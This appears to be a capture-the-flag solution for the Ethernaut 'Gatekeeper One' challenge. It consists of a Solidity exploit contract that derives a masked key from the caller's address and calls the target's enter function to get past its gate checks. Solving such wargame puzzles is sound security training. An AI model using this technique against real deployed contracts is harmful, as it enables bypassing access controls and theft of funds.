# 13 - Gatekeeper One

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneExploit {
    IGatekeeperOne private _gatekeeperOneContract;
    bytes8 private _key;

    /**
     * Constructor sets the 'GatekeeperOne' contract address and calculates the
     * `_key` needed to pass its 'gateThree' modifier.
     */
    constructor(address gateKeeperOneContractAddress) {
        _gatekeeperOneContract = IGatekeeperOne(gateKeeperOneContractAddress);
        _key = bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF);
    }

    /**
     * Calls `enter` function on 'GatekeeperOne' contract with calculated
     * `_key`. Note that this function must be called with the appropriate gas
     * for the exploit to succeed.
     */
    function enter() external {
        _gatekeeperOneContract.enter(_key);
    }
}
```
